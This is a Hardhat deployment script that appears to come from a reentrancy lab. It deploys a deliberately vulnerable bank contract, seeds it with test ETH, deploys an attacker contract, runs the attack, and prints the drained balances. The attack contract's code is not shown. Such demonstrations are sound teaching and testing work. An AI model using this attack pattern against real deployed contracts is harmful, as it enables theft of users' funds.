const { ethers } = require("hardhat");

async function main() {
  const [deployer, seeder, attackerEOA] = await ethers.getSigners();

  console.log("Deployer:", deployer.address);
  console.log("Seeder (pre-fund):", seeder.address);
  console.log("Attacker EOA:", attackerEOA.address);

  // Deploy the vulnerable bank
  const Bank = await ethers.getContractFactory("TheBank");
  const bank = await Bank.deploy();
  await bank.waitForDeployment();
  console.log("TheBank deployed to:", await bank.getAddress());

  // Seed the bank with 5 ETH from seeder so there's liquidity to steal
  const seedAmount = ethers.parseEther("5");
  await bank.connect(seeder).deposit({ value: seedAmount });
  console.log(
    "Seeded bank with 5 ETH. Bank balance:",
    ethers.formatEther(
      await ethers.provider.getBalance(await bank.getAddress())
    )
  );

  // Deploy attacker targeting the bank
  const Attacker = await ethers.getContractFactory("TheAttacker");
  const attacker = await Attacker.connect(attackerEOA).deploy(
    await bank.getAddress()
  );
  await attacker.waitForDeployment();
  console.log("Attacker contract deployed at:", await attacker.getAddress());

  // Execute the reentrancy attack: attacker sends 1 ETH into attack()
  const attackSeed = ethers.parseEther("1");
  await attacker.connect(attackerEOA).attack({ value: attackSeed });
  console.log("Attack executed.");

  // Print final balances
  const bankBal = await ethers.provider.getBalance(await bank.getAddress());
  const attackerBal = await attacker.getBalances();
  console.log("Final bank balance:", ethers.formatEther(bankBal));
  console.log("Attacker contract balance:", ethers.formatEther(attackerBal));
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
